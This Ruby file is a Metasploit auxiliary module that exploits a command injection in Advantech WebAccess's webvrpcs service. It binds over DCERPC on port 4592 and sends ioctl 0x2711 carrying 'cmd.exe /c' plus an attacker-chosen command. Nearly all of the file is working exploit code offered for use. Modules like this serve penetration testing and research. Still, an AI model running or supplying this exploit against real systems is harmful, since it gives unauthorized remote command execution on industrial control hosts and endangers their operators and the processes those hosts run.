##
#
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::DCERPC

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Advantech WebAccess webvrpcs Remote Command Injection',
      'Description'    => %q{
          This module exploits a os command injection in Advantech WebAccess webvrpcs (AdvantechWebAccessUSANode8.2_20170817.exe).
        When sending a specially crafted dcerpc request to ioctl 0x2711, an attacker can run
        arbitrary os commands in the the context of the current user.
      },
      'Author'         => [ 'Mario Ceballos'],
      'License'        => 'BSD_LICENSE',
      'References'     =>
        [
          [ 'URL', 'https://blog.exodusintel.com/2018/09/13/to-traverse-or-not-to-that-is-the-question/' ],
        ],
      'DisclosureDate' => 'Jan 5 2018'))

      register_options(
        [
          OptString.new('CMD', [ true, 'The command to execute', 'calc.exe']),
          Opt::RPORT(4592),
        ],)

 end

 def run
   connect
   handle = dcerpc_handle('5d2b62aa-ee0a-4a95-91ae-b064fdb471fc', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']])
   dcerpc_bind(handle)
   print_status("Bound to #{handle} ...")

   packet =  NDR.long(0)
   packet << NDR.long(0xc351)
   packet << NDR.long(0x04)

   begin
     resp = dcerpc.call(0x2, packet)
   rescue Rex::Proto::DCERPC::Exceptions::NoResponse
   ensure
   end

   begin
     resp = dcerpc.call(0x4, NDR.long(0))
     handle = resp.last(4).unpack('V').first

     command =  NDR.long(handle)
     command << NDR.long(0x2711)
     command << NDR.long(0)
     command << NDR.UniConformantArray("cmd.exe /c #{datastore['CMD']}\00")
     command << NDR.long(0)
     
     print_status "Sending command '#{datastore['CMD']}'..."
     dcerpc_call(0x1,command)
   rescue Rex::Proto::DCERPC::Exceptions::NoResponse
   ensure
   end
   disconnect
end
end
